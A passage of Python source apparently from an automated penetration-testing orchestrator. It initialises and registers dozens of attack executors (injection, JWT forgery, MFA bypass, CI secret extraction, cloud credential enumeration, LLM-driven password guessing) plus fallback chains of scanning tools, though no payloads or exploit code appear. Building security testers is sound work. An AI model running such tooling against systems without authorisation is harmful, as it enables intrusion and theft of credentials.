        self.auth_executor = AuthenticationExecutor(timeout_seconds=30)
        self.authz_executor = AuthorizationExecutor(timeout_seconds=30)
        self.cors_executor = CORSExecutor(timeout_seconds=15)
        self.info_disc_executor = InfoDisclosureExecutor(timeout_seconds=15)
        self.graphql_executor = GraphQLExecutor(timeout_seconds=15)
        self.ws_executor = WebSocketExecutor(timeout_seconds=15)
        self.bizlogic_executor = BusinessLogicExecutor(timeout_seconds=30)
        self.pathtraversal_executor = PathTraversalExecutor(timeout_seconds=15)
        self.jwt_executor = JWTExecutor(timeout_seconds=30)
        self.nosqli_executor = NoSQLiExecutor(timeout_seconds=30)
        self.fileupload_executor = FileUploadExecutor(timeout_seconds=30)
        self.protopollution_executor = PrototypePollutionExecutor(timeout_seconds=30)
        self.ssrf_executor = SSRFExecutor(timeout_seconds=30)
        self.xxe_executor = XXEExecutor(timeout_seconds=30)
        self.csrf_executor = CSRFExecutor(timeout_seconds=30)
        self.idor_executor = IDORExecutor(timeout_seconds=30)
        self.mass_assign_executor = MassAssignmentExecutor(timeout_seconds=30)
        # ── Tier 1 executors ──
        self.ssti_executor = SSTIExecutor(timeout_seconds=30)
        self.cmdi_executor = CommandInjectionExecutor(timeout_seconds=60)
        self.openredirect_executor = OpenRedirectExecutor(timeout_seconds=20)
        self.oauth_executor = OAuthMisconfigExecutor(timeout_seconds=30)
        self.captcha_executor = CAPTCHABypassExecutor(timeout_seconds=20)
        self.password_policy_executor = PasswordPolicyExecutor(timeout_seconds=30)
        self.ratelimit_executor = RateLimitExecutor(timeout_seconds=60)
        self.loginjection_executor = LogInjectionExecutor(timeout_seconds=30)
        self.backup_scanner_executor = BackupFileScannerExecutor(timeout_seconds=60)
        # ── Tier 2 executors ──
        self.sqli_advanced_executor = AdvancedSQLiExecutor(timeout_seconds=60)
        self.xss_advanced_executor = AdvancedXSSExecutor(timeout_seconds=45)
        self.jwt_advanced_executor = AdvancedJWTExecutor(timeout_seconds=45)
        self.upload_advanced_executor = AdvancedFileUploadExecutor(timeout_seconds=60)
        # ── Tier 3 executors ──
        self.sca_executor = SCAExecutor(timeout_seconds=90)
        self.typosquat_executor = TyposquatDetector(timeout_seconds=45)
        self.waf_evasion_executor = WAFEvasionDetector(timeout_seconds=60)
        # ── Tier 4 executors (LLM-powered) ──
        self.sec_question_executor = SecurityQuestionSolverExecutor(timeout_seconds=120)
        self.llm_password_executor = LLMPasswordDerivationExecutor(timeout_seconds=120)
        self.llm_bizlogic_executor = LLMBusinessLogicExplorerExecutor(timeout_seconds=120)
        # ── Tier 5 executors ──
        self.mfa_bypass_executor = MFABypassExecutor(timeout_seconds=60)
        self.crypto_weakness_executor = CryptoWeaknessDetector(timeout_seconds=60)
        self.llm_content_executor = LLMContentAnalyzerExecutor(timeout_seconds=120)
        # ── Tier 6 executors ──
        self.stego_executor = SteganographyDetector(timeout_seconds=90)
        self.subtitle_xss_executor = SubtitleXSSExecutor(timeout_seconds=60)
        self.nested_encoding_executor = NestedEncodingSolver(timeout_seconds=60)
        self.web3_executor = BlockchainWeb3Detector(timeout_seconds=60)
        self.race_executor = RaceConditionExploiter(timeout_seconds=60)
        self.hidden_resource_executor = HiddenResourceEnumerator(timeout_seconds=60)
        self.gdpr_abuse_executor = GDPRAbuseDetector(timeout_seconds=60)
        self.error_leak_executor = ErrorMessageLeakDetector(timeout_seconds=60)
        self.encoding_misconfig_executor = EncodingMisconfigDetector(timeout_seconds=45)
        # ── Tier 7 executors ──
        self.smuggling_executor = HTTPRequestSmugglingExecutor(timeout_seconds=30)
        self.deser_executor = InsecureDeserializationDetector(timeout_seconds=45)
        self.cloud_bucket_executor = CloudBucketEnumerator(timeout_seconds=60)
        self.takeover_executor = SubdomainTakeoverDetector(timeout_seconds=60)
        self.ldap_executor = LDAPInjectionExecutor(timeout_seconds=45)
        self.csp_executor = CSPBypassDetector(timeout_seconds=30)
        self.cache_poison_executor = WebCachePoisoningExecutor(timeout_seconds=45)
        self.dom_xss_executor = DOMXSSStaticAnalyzer(timeout_seconds=45)
        self.saml_executor = SAMLFlawDetector(timeout_seconds=45)
        self.prompt_injection_executor = PromptInjectionTester(timeout_seconds=60)
        self.cicd_executor = CICDExposureScanner(timeout_seconds=60)
        self.basic_auth_executor = BasicAuthBypassExecutor(timeout_seconds=45)
        self.header_ratelimit_executor = HeaderRateLimitBypassExecutor(timeout_seconds=60)
        # ── Tier 8 credentialed ──
        self.aws_creds_executor = AWSCredentialedEnumerator(timeout_seconds=60)
        self.azure_creds_executor = AzureCredentialedEnumerator(timeout_seconds=45)
        self.gcp_creds_executor = GCPCredentialedEnumerator(timeout_seconds=45)
        self.k8s_creds_executor = KubernetesRBACExecutor(timeout_seconds=60)
        self.ci_secrets_executor = CIPipelineSecretExtractor(timeout_seconds=60)
        # ── Tier 8 browser-runtime ──
        self.live_dom_xss_executor = LiveDOMXSSExecutor(timeout_seconds=120)
        self.live_postmsg_executor = LivePostMessageAbuseDetector(timeout_seconds=120)
        self.live_clickjacking_executor = LiveClickjackingDetector(timeout_seconds=90)
        self.live_csp_executor = LiveCSPBypassAttempt(timeout_seconds=90)
        # ── PHASE 5 — differential / parser / metamorphic / invariant research ──
        self.differential_research_executor = DifferentialResearchExecutor(timeout_seconds=60)
        self.metamorphic_executor = MetamorphicConsistencyExecutor(timeout_seconds=60)
        self.invariant_oracle_executor = InvariantOracleExecutor(timeout_seconds=45)
        self.executor_registry = {
            # ── PHASE 5 research executors (spec Points A/B/C, P1.4-1.7) ──
            "differential_representation_01": self.differential_research_executor,
            "parser_differential_01": self.differential_research_executor,
            "metamorphic_consistency_01": self.metamorphic_executor,
            "security_invariant_01": self.invariant_oracle_executor,
            "sqli": self.sqli_executor,
            "sqli_basic_01": self.sqli_executor,
            "sqli_time_based_01": self.sqli_executor,
            "sqli_error_based_01": self.sqli_executor,
            "sqli_union_01": self.sqli_executor,
            "sqli_stacked_01": self.sqli_executor,
            "sqli_blind_01": self.sqli_executor,
            "xss": self.xss_executor,
            "xss_reflected_01": self.xss_executor,
            "xss_stored_01": self.xss_executor,
            "xss_dom_01": self.xss_executor,
            "authentication": self.auth_executor,
            "auth_login_01": self.auth_executor,
            "auth_session_hijack_01": self.auth_executor,
            "auth_default_creds_01": self.auth_executor,
            "auth_credential_stuffing_01": self.auth_executor,
            "auth_password_policy_01": self.auth_executor,
            "auth_mfa_bypass_01": self.auth_executor,
            "auth_session_fixation_01": self.auth_executor,
            "authorization": self.authz_executor,
            "authz_idor_01": self.idor_executor,
            "authz_idor_02": self.idor_executor,
            "authz_priv_esc_01": self.authz_executor,
            "authz_horizontal_01": self.idor_executor,
            "authz_forced_browsing_01": self.info_disc_executor,
            "authz_mass_assignment_01": self.mass_assign_executor,
            "authz_mass_assignment_02": self.mass_assign_executor,
            "authz_mass_assignment_03": self.mass_assign_executor,
            "cors_misconfig_01": self.cors_executor,
            "cors_misconfig_02": self.cors_executor,
            "cors_misconfig_03": self.cors_executor,
            "cors_wildcard_01": self.cors_executor,
            "info_disclosure_01": self.info_disc_executor,
            "graphql_introspection_01": self.graphql_executor,
            "graphql_mutation_01": self.graphql_executor,
            "graphql_dos_01": self.graphql_executor,
            "ws_hijack_01": self.ws_executor,
            "race_condition_01": self.bizlogic_executor,
            "workflow_bypass_01": self.bizlogic_executor,
            "bizlogic_price_manipulation_01": self.bizlogic_executor,
            "bizlogic_negative_quantity_01": self.bizlogic_executor,
            "bizlogic_coupon_abuse_01": self.bizlogic_executor,
            "bizlogic_free_item_01": self.bizlogic_executor,
            "path_traversal_01": self.pathtraversal_executor,
            "path_directory_01": self.pathtraversal_executor,
            # JWT
            "jwt_manipulation_01": self.jwt_executor,
            "jwt_algo_confusion_01": self.jwt_executor,
            "jwt_none_algo_01": self.jwt_executor,
            "jwt_expiry_01": self.jwt_executor,
            "jwt_jwk_injection_01": self.jwt_executor,
            # NoSQL injection
            "nosqli_basic_01": self.nosqli_executor,
            "nosqli_logical_01": self.nosqli_executor,
            "nosqli_regex_01": self.nosqli_executor,
            "nosqli_js_01": self.nosqli_executor,
            # File upload
            "upload_type_01": self.fileupload_executor,
            "upload_rce_01": self.fileupload_executor,
            "upload_archive_01": self.fileupload_executor,
            "upload_zip_slip_01": self.fileupload_executor,
            "upload_mime_bypass_01": self.fileupload_executor,
            "upload_filename_01": self.fileupload_executor,
            "upload_svg_xss_01": self.fileupload_executor,
            "upload_polyglot_01": self.fileupload_executor,
            # Prototype pollution
            "proto_pollution_01": self.protopollution_executor,
            "proto_pollution_param_01": self.protopollution_executor,
            "proto_pollution_merge_01": self.protopollution_executor,
            # SSRF
            "ssrf_basic_01": self.ssrf_executor,
            "ssrf_cloud_01": self.ssrf_executor,
            "ssrf_redirect_01": self.ssrf_executor,
            "ssrf_protocol_01": self.ssrf_executor,
            # XXE
            "xxe_basic_01": self.xxe_executor,
            "xxe_blind_01": self.xxe_executor,
            "xxe_oob_01": self.xxe_executor,
            # CSRF
            "csrf_basic_01": self.csrf_executor,
            "csrf_token_01": self.csrf_executor,
            "csrf_method_01": self.csrf_executor,
            "csrf_samesite_01": self.csrf_executor,
            "csrf_referer_01": self.csrf_executor,
            # SSTI (Tier 1)
            "ssti_basic_01": self.ssti_executor,
            "ssti_sandbox_01": self.ssti_executor,
            # Command injection (Tier 1)
            "cmdi_basic_01": self.cmdi_executor,
            "cmdi_blind_01": self.cmdi_executor,
            # Deserialization
            "deser_java_01": self.info_disc_executor,
            "deser_php_01": self.info_disc_executor,
            # Open redirect (Tier 1)
            "redirect_basic_01": self.openredirect_executor,
            "redirect_param_01": self.openredirect_executor,
            "redirect_allowlist_bypass_01": self.openredirect_executor,
            # OAuth misconfig (Tier 1)
            "oauth_redirect_01": self.oauth_executor,
            "oauth_state_01": self.oauth_executor,
            "oauth_token_leak_01": self.oauth_executor,
            # CAPTCHA bypass (Tier 1)
            "captcha_bypass_01": self.captcha_executor,
            "captcha_reuse_01": self.captcha_executor,
            # Password policy (Tier 1)
            "password_policy_01": self.password_policy_executor,
            "password_strength_01": self.password_policy_executor,
            # Rate limiting (Tier 1)
            "ratelimit_login_01": self.ratelimit_executor,
            "ratelimit_registration_01": self.ratelimit_executor,
            "ratelimit_api_01": self.ratelimit_executor,
            # Log injection (Tier 1)
            "log_injection_01": self.loginjection_executor,
            "log_forging_01": self.loginjection_executor,
            # Backup / sensitive file exposure (Tier 1)
            "backup_file_01": self.backup_scanner_executor,
            "backup_directory_01": self.backup_scanner_executor,
            "hidden_file_01": self.backup_scanner_executor,
            "git_exposure_01": self.backup_scanner_executor,
            "env_exposure_01": self.backup_scanner_executor,
            # ── Tier 2 ──
            # Advanced SQLi
            "sqli_union_advanced_01": self.sqli_advanced_executor,
            "sqli_schema_leak_01": self.sqli_advanced_executor,
            "sqli_insert_01": self.sqli_advanced_executor,
            "sqli_time_blind_advanced_01": self.sqli_advanced_executor,
            # Advanced XSS (stored, bypass, header)
            "xss_stored_advanced_01": self.xss_advanced_executor,
            "xss_bypass_01": self.xss_advanced_executor,
            "xss_header_injection_01": self.xss_advanced_executor,
            "xss_api_only_01": self.xss_advanced_executor,
            # Advanced JWT (key confusion, jku/jwk, kid)
            "jwt_rs256_hs256_01": self.jwt_advanced_executor,
            "jwt_jku_injection_01": self.jwt_advanced_executor,
            "jwt_jwk_header_01": self.jwt_advanced_executor,
            "jwt_kid_injection_01": self.jwt_advanced_executor,
            # Advanced upload / LFI-via-param / zip-slip / symlink
            "upload_zip_slip_advanced_01": self.upload_advanced_executor,
            "upload_symlink_archive_01": self.upload_advanced_executor,
            "lfi_via_param_01": self.upload_advanced_executor,
            # ── Tier 3 ──
            # SCA / dependency CVE scanning via OSV.dev
            "sca_npm_01": self.sca_executor,
            "sca_pypi_01": self.sca_executor,
            "sca_composer_01": self.sca_executor,
            "sca_rubygems_01": self.sca_executor,
            "sca_maven_01": self.sca_executor,
            "sca_go_01": self.sca_executor,
            "sca_cargo_01": self.sca_executor,
            "sca_manifest_exposed_01": self.sca_executor,
            "sca_outdated_01": self.sca_executor,
            "sca_cve_01": self.sca_executor,
            # Typosquat
            "sca_typosquat_01": self.typosquat_executor,
            "sca_typosquat_pypi_01": self.typosquat_executor,
            # WAF detection + evasion
            "waf_detect_01": self.waf_evasion_executor,
            "waf_bypass_01": self.waf_evasion_executor,
            "waf_monitoring_bypass_01": self.waf_evasion_executor,
            # ── Tier 4 (LLM-powered) ──
            "auth_security_question_01": self.sec_question_executor,
            "auth_password_reset_llm_01": self.sec_question_executor,
            "auth_password_guess_01": self.llm_password_executor,
            "auth_osint_password_01": self.llm_password_executor,
            "bizlogic_llm_01": self.llm_bizlogic_executor,
            "bizlogic_workflow_llm_01": self.llm_bizlogic_executor,
            "bizlogic_gdpr_01": self.llm_bizlogic_executor,
            "bizlogic_coupon_llm_01": self.llm_bizlogic_executor,
            "bizlogic_price_llm_01": self.llm_bizlogic_executor,
            # ── Tier 5 ──
            "mfa_bypass_01": self.mfa_bypass_executor,
            "mfa_brute_01": self.mfa_bypass_executor,
            "mfa_disable_01": self.mfa_bypass_executor,
            "mfa_backup_reuse_01": self.mfa_bypass_executor,
            "crypto_weak_hash_01": self.crypto_weakness_executor,
            "crypto_encoding_01": self.crypto_weakness_executor,
            "crypto_random_01": self.crypto_weakness_executor,
            "crypto_client_side_01": self.crypto_weakness_executor,
            "content_analysis_01": self.llm_content_executor,
            "hidden_info_01": self.llm_content_executor,
            "js_secrets_01": self.llm_content_executor,
            "deprecated_interface_01": self.llm_content_executor,
            # ── Tier 6 ──
            "stego_lsb_01": self.stego_executor,
            "stego_appended_01": self.stego_executor,
            "stego_exif_01": self.stego_executor,
            "video_subtitle_xss_01": self.subtitle_xss_executor,
            "subtitle_upload_01": self.subtitle_xss_executor,
            "nested_encoding_01": self.nested_encoding_executor,
            "encoding_chain_01": self.nested_encoding_executor,
            "web3_rpc_exposed_01": self.web3_executor,
            "web3_privkey_leak_01": self.web3_executor,
            "web3_mnemonic_leak_01": self.web3_executor,
            "web3_abi_exposed_01": self.web3_executor,
            "race_condition_parallel_01": self.race_executor,
            "hidden_resource_enum_01": self.hidden_resource_executor,
            "hidden_product_01": self.hidden_resource_executor,
            "gdpr_no_auth_01": self.gdpr_abuse_executor,
            "gdpr_cross_user_01": self.gdpr_abuse_executor,
            "error_leak_stack_01": self.error_leak_executor,
            "error_leak_path_01": self.error_leak_executor,
            "error_leak_credential_01": self.error_leak_executor,
            "error_leak_email_01": self.error_leak_executor,
            "encoding_utf7_xss_01": self.encoding_misconfig_executor,
            "encoding_double_url_01": self.encoding_misconfig_executor,
            "encoding_overlong_utf8_01": self.encoding_misconfig_executor,
            # ── Tier 7 ──
            "smuggling_cl_te_01": self.smuggling_executor,
            "smuggling_te_cl_01": self.smuggling_executor,
            "smuggling_te_te_01": self.smuggling_executor,
            "deser_java_advanced_01": self.deser_executor,
            "deser_php_advanced_01": self.deser_executor,
            "deser_python_pickle_01": self.deser_executor,
            "deser_dotnet_01": self.deser_executor,
            "cloud_s3_public_01": self.cloud_bucket_executor,
            "cloud_azure_public_01": self.cloud_bucket_executor,
            "cloud_gcs_public_01": self.cloud_bucket_executor,
            "cloud_bucket_exists_01": self.cloud_bucket_executor,
            "subdomain_takeover_01": self.takeover_executor,
            "ldap_injection_01": self.ldap_executor,
            "ldap_wildcard_bypass_01": self.ldap_executor,
            "csp_missing_01": self.csp_executor,
            "csp_unsafe_inline_01": self.csp_executor,
            "csp_wildcard_01": self.csp_executor,
            "csp_bypassable_cdn_01": self.csp_executor,
            "cache_poison_unkeyed_header_01": self.cache_poison_executor,
            "cache_poison_confirmed_01": self.cache_poison_executor,
            "dom_xss_static_01": self.dom_xss_executor,
            "saml_unsigned_01": self.saml_executor,
            "saml_comment_injection_01": self.saml_executor,
            "prompt_injection_01": self.prompt_injection_executor,
            "cicd_exposed_01": self.cicd_executor,
            "cicd_jenkins_01": self.cicd_executor,
            "cicd_gitlab_01": self.cicd_executor,
            "cicd_docker_registry_01": self.cicd_executor,
            "basic_auth_bypass_01": self.basic_auth_executor,
            "rate_limit_header_bypass_01": self.header_ratelimit_executor,
            # ── Tier 8: credentialed cloud + K8s + CI ──
            "aws_creds_enum_01": self.aws_creds_executor,
            "aws_iam_readable_01": self.aws_creds_executor,
            "aws_s3_full_list_01": self.aws_creds_executor,
            "aws_lambda_readable_01": self.aws_creds_executor,
            "azure_creds_enum_01": self.azure_creds_executor,
            "azure_graph_users_01": self.azure_creds_executor,
            "azure_resource_groups_01": self.azure_creds_executor,
            "gcp_creds_enum_01": self.gcp_creds_executor,
            "gcp_projects_list_01": self.gcp_creds_executor,
            "gcp_buckets_list_01": self.gcp_creds_executor,
            "k8s_rbac_audit_01": self.k8s_creds_executor,
            "k8s_secrets_readable_01": self.k8s_creds_executor,
            "k8s_pod_exec_01": self.k8s_creds_executor,
            "k8s_cluster_admin_01": self.k8s_creds_executor,
            "ci_secret_extract_01": self.ci_secrets_executor,
            "jenkins_script_01": self.ci_secrets_executor,
            "gitlab_secret_leak_01": self.ci_secrets_executor,
            # ── Tier 8: browser-runtime ──
            "dom_xss_live_01": self.live_dom_xss_executor,
            "reflected_xss_live_01": self.live_dom_xss_executor,
            "postmessage_abuse_01": self.live_postmsg_executor,
            "clickjacking_live_01": self.live_clickjacking_executor,
            "csp_live_bypass_01": self.live_csp_executor,
            # CRLF
            "crlf_basic_01": self.info_disc_executor,
            "crlf_header_01": self.info_disc_executor,
        }
        self._register_capabilities()
        # Share one Portfolio globally so core.common.tool_retry can consult it.
        from core.tools.tool_portfolio import get_global_portfolio
        self.tool_portfolio = get_global_portfolio()
        self.tool_portfolio.register_fallback_chain("sql_injection", ["sqlmap", "nuclei", "custom_mutator"])
        self.tool_portfolio.register_fallback_chain("xss", ["dalfox", "nuclei", "browser"])
        self.tool_portfolio.register_fallback_chain("port_discovery", ["nmap", "masscan", "port_check"])
        self.tool_portfolio.register_fallback_chain("subdomain_enumeration", ["subfinder", "amass", "assetfinder", "dnsenum"])
        self.tool_portfolio.register_fallback_chain("dns_intelligence", ["dig", "dnsenum", "fierce", "whois"])
        self.tool_portfolio.register_fallback_chain("directory_bruteforce", ["ffuf", "feroxbuster", "gobuster", "dirsearch", "dirb"])
        self.tool_portfolio.register_fallback_chain("web_crawling", ["katana", "gobuster", "ffuf"])
        self.tool_portfolio.register_fallback_chain("technology_fingerprinting", ["httpx", "whatweb", "wafw00f"])
        self.tool_portfolio.register_fallback_chain("vulnerability_scanning", ["nuclei", "nikto", "wpscan"])

        # ── P1c: Evidence / Oracle / Finding ──
        self.evidence_validator = EvidenceValidator()
        self.finding_state_machine = FindingStateMachine()
        self.finding_store_v2 = FindingStoreV2(storage_path="findings_v2.json")

        # ── P2: Coverage ──
        self.test_catalog_v2 = build_default_catalog()
        self.endpoint_inventory = EndpointInventoryV2()
        self.applicability_engine = ApplicabilityEngine(self.test_catalog_v2, self.attack_surface)
        self.coverage_matrix = CoverageMatrix([], [])
        self.convergence_engine = ConvergenceEngineV2(self.coverage_matrix)

        # ── P3: Integration + Reporting ──
        self.pipeline_v2 = ExecutionPipelineV2(
            executor_registry=self.executor_registry,
            tool_portfolio=self.tool_portfolio,
            coverage_matrix=self.coverage_matrix,
            finding_store=self.finding_store_v2,
            evidence_validator=self.evidence_validator,
        )
        self.hypothesis_engine = HypothesisEngine(
            test_catalog=self.test_catalog_v2,
            attack_surface=self.attack_surface,
        )
        self.knowledge_graph = KnowledgeGraph()
        self.failure_classifier = FailureClassifier()
        self.recovery_policy = RecoveryPolicy()

        # ── P4-P8: Canonical Pipeline Modules ──
        self.payload_catalog = build_default_payload_catalog()
        self.hypothesis_engine_v2 = HypothesisEngineV2(self.test_catalog_v2)
        self.identity_coverage = IdentityCoverageEngine()
        self.feedback_loop = FeedbackLoopEngine()
        self.target_health_manager = TargetHealthManager(target=target, max_concurrency=10)
        self.parallel_executor = ParallelExecutor(
            max_concurrency=5,
            task_timeout=120.0,
            health_manager=self.target_health_manager,
        )
        self.structured_learning = StructuredLearningEngine()
        self.poc_gate = POCGate()
        self.tool_argument_validator = ToolArgumentValidator(
            tool_registry=self.tools,
            scope_manager=self.scope_manager if hasattr(self, 'scope_manager') else None,
        )
        self.spa_detector = SPADetector()
        from core.orchestration.decision_pipeline import GranularBudget
        self.granular_budget = GranularBudget()

        # ── Strix Pattern #1: Skill System ──
        from core.skills import SkillLoader
        self.skill_loader = SkillLoader()

        # ── Strix Pattern #2: Coverage Tracker ──
        from core.coverage.coverage_tracker import CoverageTracker
        self.coverage_tracker = CoverageTracker(
            output_dir=str(Path(getattr(self, 'output_dir', 'reports')))
        )

        # ── Strix Pattern #3: Error Classifier + Retry Executor ──
        from core.error.error_classifier import ErrorClassifier, RetryExecutor
        self.error_classifier = ErrorClassifier()
        self.retry_executor = RetryExecutor(self.error_classifier)

        # ── Strix Pattern #4: Confidence Scorer ──
        from core.scoring.confidence_scorer import ConfidenceScorer
        self.confidence_scorer = ConfidenceScorer()

        self.canonical_reporter = CanonicalReporter(
            attack_surface=getattr(self.ctx, 'attack_surface', None),
            coverage_engine=self.coverage_engine if hasattr(self, 'coverage_engine') else None,
            identity_coverage=self.identity_coverage,
            learning_engine=self.structured_learning,
            convergence_engine=self.convergence_engine,
            target_health=self.target_health_manager,
        )

        logger.info("[CentralBrain] P0-P8 modules initialized and linked")

        if resume_checkpoint:
            logger.info(f"Resuming from checkpoint: {resume_checkpoint}")
            state = self.checkpointer.load_checkpoint(resume_checkpoint)
            if state:
                self.checkpointer.apply_checkpoint(self, state)

    def _log_activity(self, action, title, **kwargs):
        try:
            self._activity.record(
                scan_id=self._scan_id, action=action, title=title,
                target=kwargs.get("target", self.ctx.target),
                phase=kwargs.get("phase", getattr(self.current_phase, "value", "")),
                **{k: v for k, v in kwargs.items() if k not in ("target", "phase")},
            )
        except Exception:
            pass

    def _register_capabilities(self):
        for name, executor in [
            ("sqli", self.sqli_executor),
            ("xss", self.xss_executor),
            ("authentication", self.auth_executor),
            ("authorization", self.authz_executor),
        ]:
            self.capability_registry.register(CapabilityDefinition(
                name=name,
                executor_class=type(executor),
                timeout_seconds=executor.timeout_seconds,
                description=f"Deterministic {name} executor",
            ))

    def _build_coverage_matrix_from_surface(self):
        endpoints = self.endpoint_inventory.list_endpoints()
        ep_ids = [ep.get("endpoint_id", ep.get("url", "")) for ep in endpoints]

        applicable_pairs = []
        not_discovered_pairs = []
        identities = list(self.security_context_v2.identities.keys()) or ["default"]

        # Phase 5/30: Use classify_all_tests for NOT_DISCOVERED distinction
        discovered_features = {}
        if hasattr(self.ctx, 'attack_surface') and self.ctx.attack_surface:
            surface = self.ctx.attack_surface
            discovered_features = {
                "has_jwt": any("jwt" in str(t).lower() for t in getattr(surface, '_technologies', {}).values()),
                "has_graphql": any("graphql" in str(ep).lower() for ep in getattr(surface, '_endpoints', {}).values()),
                "has_websocket": any("ws" in str(ep).lower() for ep in getattr(surface, '_endpoints', {}).values()),
                "has_login": any(kw in str(ep).lower() for ep in getattr(surface, '_endpoints', {}).values() for kw in ("login", "signin", "auth")),
                "has_otp": any(kw in str(ep).lower() for ep in getattr(surface, '_endpoints', {}).values() for kw in ("otp", "mfa", "2fa")),
            }

        for ep in endpoints:
            classified = self.applicability_engine.classify_all_tests(
                ep, identities=identities, discovered_features=discovered_features,
            )
            ep_id = ep.get("endpoint_id", ep.get("url", ""))
            for t in classified.get("applicable", []):
                applicable_pairs.append((ep_id, t.test_id))
            for t in classified.get("not_discovered", []):
                not_discovered_pairs.append((ep_id, t.test_id))

        if not applicable_pairs:
            return

        # Include NOT_DISCOVERED test IDs in the matrix so they can be promoted later
        nd_test_ids = {p[1] for p in not_discovered_pairs}
        all_ep_ids = list({p[0] for p in applicable_pairs} | {p[0] for p in not_discovered_pairs})
        all_test_ids = list({p[1] for p in applicable_pairs} | nd_test_ids)
        self.coverage_matrix = CoverageMatrix(all_ep_ids, all_test_ids)

        # Mark NOT_DISCOVERED cells
        from core.coverage.coverage_matrix import CoverageState
        for ep_id, test_id in not_discovered_pairs:
            if (ep_id, test_id) not in {(a, b) for a, b in applicable_pairs}:
                self.coverage_matrix.update(ep_id, test_id, CoverageState.NOT_DISCOVERED)

        self.convergence_engine = ConvergenceEngineV2(self.coverage_matrix)
        self.pipeline_v2 = ExecutionPipelineV2(
            executor_registry=self.executor_registry,
            tool_portfolio=self.tool_portfolio,
            coverage_matrix=self.coverage_matrix,
            finding_store=self.finding_store_v2,
            evidence_validator=self.evidence_validator,
        )
        logger.info(f"[CoverageMatrix] Built: {len(all_ep_ids)} endpoints × {len(all_test_ids)} tests "
                    f"= {len(applicable_pairs)} applicable + {len(not_discovered_pairs)} not_discovered")

    def _feed_endpoints_to_v2(self):
        count = 0

        def _params_of(ep):
            out = []
            for p in getattr(ep, "parameters", []) or []:
                pt = getattr(p, "parameter_type", None)
                loc = pt.value if hasattr(pt, "value") else (pt or "query")
                out.append({"name": getattr(p, "name", ""), "location": loc})
            return out

        def _feed_obj(ep):
            self.endpoint_inventory.add_endpoint({
                "endpoint_id": getattr(ep, "endpoint_id", "")
                or (ep.canonical_id() if hasattr(ep, "canonical_id") else ""),
                "url": getattr(ep, "url", "") or getattr(ep, "path", ""),
                "method": (ep.method_set[0] if getattr(ep, "method_set", None) else "GET"),
                "parameters": _params_of(ep),
                "auth_required": getattr(ep, "auth_required", False),
                "content_type": getattr(ep, "content_type", "") or "text/html",
            })

        eps = getattr(self.ctx, "endpoints", None) or {}
        ep_iter = eps.values() if isinstance(eps, dict) else eps
        for ep in ep_iter:
            try:
                if isinstance(ep, str):
                    self.endpoint_inventory.add_endpoint({"url": ep, "method": "GET"})
                elif isinstance(ep, dict):
                    self.endpoint_inventory.add_endpoint(ep)
                else:
                    _feed_obj(ep)
                count += 1
            except Exception as e:
                logger.debug(f"[V2Sync] ctx endpoint feed skipped: {e}")

        # Pull the deduped AttackSurfaceState endpoints (store #2, authoritative).
        surface = getattr(self.ctx, "attack_surface", None)
        surf_eps = getattr(surface, "endpoints", None)
        if isinstance(surf_eps, dict):
            for ep in surf_eps.values():
                try:
                    _feed_obj(ep)
                    count += 1
                except Exception as e:
                    logger.debug(f"[V2Sync] surface endpoint feed skipped: {e}")

        if count > 0:
            uniq = len(self.endpoint_inventory.list_endpoints())
            logger.info(f"[V2Sync] Fed {count} endpoint records into EndpointInventoryV2 "
                        f"({uniq} unique)")
            self.security_context_v2.endpoints = {
                str(ep.get("endpoint_id") or ep.get("url") or ""): ep
                for ep in self.endpoint_inventory.list_endpoints()
            }

    def _sync_v1_findings_to_coverage_matrix(self):
        if not hasattr(self, 'coverage_matrix') or not self.coverage_matrix:
            return

        matrix = self.coverage_matrix.get_matrix()
        if not matrix:
            return

        _VULN_TO_TESTS = {
            "NUCLEI_MATCH": ["info_disclosure_01", "cors_misconfig_01"],
            "NIKTO_FINDING": ["info_disclosure_01", "path_directory_01"],
            "MISSING_HEADER": ["header_injection_01", "info_disclosure_01"],
            "TLS_WEAKNESS": ["info_disclosure_01"],
            "INFO_DISCLOSURE": ["info_disclosure_01"],
        }
        _KEYWORD_TO_TESTS = {
            "sqli": ["sqli_basic_01", "sqli_time_based_01", "sqli_error_based_01", "sqli_union_01"],
            "sql injection": ["sqli_basic_01", "sqli_time_based_01", "sqli_error_based_01"],
            "xss": ["xss_reflected_01", "xss_stored_01", "xss_dom_01"],
            "cross-site scripting": ["xss_reflected_01", "xss_stored_01"],
            "csrf": ["csrf_token_01"],
            "ssrf": ["ssrf_basic_01", "ssrf_cloud_01"],
            "command injection": ["cmdi_basic_01"],
            "path traversal": ["path_traversal_01"],
            "directory": ["path_directory_01"],
            "open redirect": ["open_redirect_01"],
            "cors": ["cors_misconfig_01"],
            "idor": ["authz_idor_01", "authz_horizontal_01"],
            "privilege": ["authz_priv_esc_01"],
            "brute": ["auth_login_01"],
            "default cred": ["auth_default_creds_01"],
            "session": ["auth_session_hijack_01"],
            "jwt": ["jwt_manipulation_01", "jwt_algo_confusion_01", "jwt_none_algo_01"],
            "xxe": ["xxe_basic_01"],
            "ssti": ["ssti_basic_01"],
            "template injection": ["ssti_basic_01"],
            "nosql": ["nosqli_basic_01", "nosqli_logical_01"],
            "file upload": ["upload_type_01", "upload_rce_01"],
            "graphql": ["graphql_introspection_01", "graphql_mutation_01"],
            "websocket": ["ws_hijack_01"],
            "race condition": ["race_condition_01"],
            "ldap": ["ldap_injection_01"],
            "nuclei": ["info_disclosure_01"],
        }

        ep_ids = list(matrix.keys())
        confirmed_cells = set()
        tested_tests = set()

        for vuln in getattr(self.ctx, 'vulnerabilities', []):
            if not isinstance(vuln, dict):
                continue
            vtype = vuln.get("type", "")
            title = (vuln.get("title", "") or "").lower()
            location = vuln.get("location", "") or vuln.get("target", "")

            matched_tests = set()
            if vtype in _VULN_TO_TESTS:
                matched_tests.update(_VULN_TO_TESTS[vtype])
            for kw, tids in _KEYWORD_TO_TESTS.items():
                if kw in title:
                    matched_tests.update(tids)

            if not matched_tests:
                matched_tests.add("info_disclosure_01")

            best_ep = None
            if location:
                loc_lower = location.lower()
                for eid in ep_ids:
                    if eid.lower() in loc_lower or loc_lower in eid.lower():
                        best_ep = eid
                        break
            if not best_ep and ep_ids:
                best_ep = ep_ids[0]

            if best_ep:
                for tid in matched_tests:
                    if tid in matrix.get(best_ep, {}):
                        from core.coverage.coverage_matrix import CoverageState
                        self.coverage_matrix.update_state(best_ep, tid, CoverageState.CONFIRMED)
                        confirmed_cells.add((best_ep, tid))
                        tested_tests.add(tid)

        _TOOL_CAPS_TO_TESTS = {
            "vulnerability_scanning": [
                "sqli_basic_01", "xss_reflected_01", "xss_stored_01", "cmdi_basic_01",
                "path_traversal_01", "path_directory_01", "info_disclosure_01",
